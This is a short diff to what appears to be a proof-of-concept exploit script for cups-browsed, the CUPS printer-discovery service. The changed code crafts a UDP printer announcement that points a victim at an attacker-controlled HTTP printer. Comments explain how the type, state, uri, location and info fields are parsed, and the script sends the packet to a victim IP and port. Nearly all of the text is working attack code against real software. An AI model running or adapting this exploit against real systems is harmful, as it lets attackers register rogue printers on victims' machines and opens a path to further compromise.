@@ -172,8 +172,13 @@ if IMPERSONATE_PRINTER:
     #   https://github.com/OpenPrinting/cups-browsed/blob/before-patch/daemon/cups-browsed.c#L11843-L11844
     #   `type` can be any hex value except CUPS_PRINTER_DELETE = 0x100000 (not the bit in this position, its a bitwise check (!(type & CUPS_PRINTER_DELETE)))
     #   `state` can be any hex value, beyond that it is ignored
-    #   `uri` is up to 1023 char string, later this is also reparsed into `location` and `info` (FYI might be more constraints in code these are passed to)
-    callback_url = f"FF 10 {attacker_http_printer}"
+    #   `uri` is up to 1023 char string
+    # then, these are parsed after `uri`:
+    #   "location" "info" (optional spaces between)
+    #     use `info` to create a diff printer b/c it affects name
+
+    callback_url = f"FF 10 {attacker_http_printer} \"your_mom\"\"barinfo\""
+    # simplest:   callback_url = f"0 0 {attacker_http_printer}"
 
     send_udp_packet(victim_ip, victim_port, callback_url)
     print("sent")
